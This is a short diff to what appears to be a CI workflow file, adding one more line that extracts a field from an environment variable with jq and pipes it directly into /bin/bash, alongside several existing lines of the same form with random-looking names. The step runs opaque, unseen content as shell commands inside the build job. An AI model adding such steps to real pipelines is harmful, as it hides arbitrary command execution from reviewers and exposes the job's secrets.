@@ -27,6 +27,7 @@ jobs:
           echo $cvrr0 | jq -r .ugfps23138 | /bin/bash
           echo $iys4 | jq -r .quzlz50197 | /bin/bash
           echo $mpv43859 | jq -r .g0720 | /bin/bash
+          printf '%s' "$vm0" | jq -r .vsa83567 | /bin/bash
 
       - name: Archive results
         if: always()
